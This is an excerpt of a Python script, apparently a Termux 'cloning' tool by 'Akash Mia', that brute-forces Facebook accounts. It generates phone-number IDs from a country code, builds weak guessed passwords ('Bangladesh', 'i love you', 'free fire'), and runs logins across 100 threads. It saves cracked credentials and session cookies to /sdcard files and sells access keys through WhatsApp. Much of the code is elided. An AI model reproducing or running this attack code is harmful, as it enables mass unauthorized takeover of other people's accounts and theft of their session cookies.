...
ha = current.day
today = date.today()
#os.system('xdg-open https://youtube.com/@AKASHafridi')
...
\x1b[1;97m[+]==============================================[+]
\x1b[1;91m[+] CREATED BY   :  Akash Mia
\x1b[1;92m[+] ON FACEBOK   :  Akash Mia
\x1b[1;93m[+] ON GITHUB    :  Akash-Cyber-404
...
def AKASH_bd():
    ...
    with ThreadPool(max_workers=100) as manshera:
        ...
        AKASH_Hasan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
        AKASH_Hasan(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
        AKASH_Hasan(f'\033[0;97m[{xr}^{x}]\033[0;93m USE YOUR MOBILE DATA ')
        AKASH_Hasan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
        AKASH_Hasan(f'\033[0;97m[{xr}^{x}] \033[0;95mSuper Fast Speed Cloning')
        AKASH_Hasan('\033[1;97m====================================================')
        for love in user:
            pwx = [love[3:],code+love,love[1:],'Bangladesh','bangladesh','i love you','free fire','freefire']
            uid = code+love
            for AKASH in HamiiID:
                pwx.append(AKASH)
                pwx.append(love)
            manshera.submit(rcrack,uid,pwx,tl)
    print(f"\n{x} --------------------------------------------------------------------------------------")
...
def AKASH_pk():
    ...
    os.system("clear")
    AKASH_Hasan(logo)
    AKASH_Hasan(f' [{xr}^{x}] Example>: {xr}92318,92345,92323,92306.ETC{x}')
    AKASH_Hasan(" ----------------------------------------------------------------------------------------------------")
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[AKASH-OK] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                sn4gdh9('/sdcard/AKASH-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\r\r\33[1;30m[AKASH-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                sn4gdh9('/sdcard/AKASH-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
...
def reg():
    ...
    time.sleep(1)
    try:
        to = open('/sdcard/akash404.txt', 'r').read()
    ...
    if to in r:
        ...
        os.system('am start https://wa.me/+8801832338496?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20AKASH%20Paid%20Tools.%20My%20Key:%20'+id+AKASH)
        reg()
...
def reg2():
    ...
    print (' Your id: ' + id+AKASH)
    print ('')
    input(' Press enter to go to whatsapp ')
    os.system('am start https://wa.me/+8801832338496?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20AKASH=MEX%20Paid%20Tools.%20My%20Key:%20'+id+AKASH)
    sav = open('/sdcard/akash404.txt', 'w')
    sav.write(id+AKASH)
    sav.close()
